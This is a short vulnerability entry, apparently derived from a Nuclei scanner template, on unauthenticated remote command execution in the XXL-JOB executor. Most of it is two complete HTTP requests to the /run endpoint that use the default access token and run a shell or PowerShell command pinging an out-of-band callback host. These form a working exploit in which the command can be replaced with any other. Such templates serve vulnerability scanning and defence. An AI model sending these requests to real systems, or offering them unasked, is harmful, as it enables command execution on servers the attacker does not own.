# Vulnerability: XXL-JOB executor - Unauthorized Access
**Classification:** XXLJOB
**Source:** Nuclei Template (`xxljob-executor-unauth.yaml`)

## Description
XXL-JOB is a distributed task scheduling platform. Its core design goals are rapid development, easy learning, lightweight, and easy expansion. The source code is now open and connected to the online product lines of many companies, ready to use out of the box. XXL-JOB is divided into two ends: admin and executor. The former is the background management page, and the latter is the client for task execution. The executor is not configured with authentication by default, and unauthorized attackers can execute arbitrary commands through the RESTful API.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /run HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Xxl-Job-Access-Token: default_token
Content-Length: 396

{
  "jobId": {{rand_int(1000)}},
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "ping {{interactsh-url}}",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}

POST /run HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Xxl-Job-Access-Token: default_token
Content-Length: 396

{
  "jobId": {{rand_int(1000)}},
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_POWERSHELL",
  "glueSource": "ping {{interactsh-url}}",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

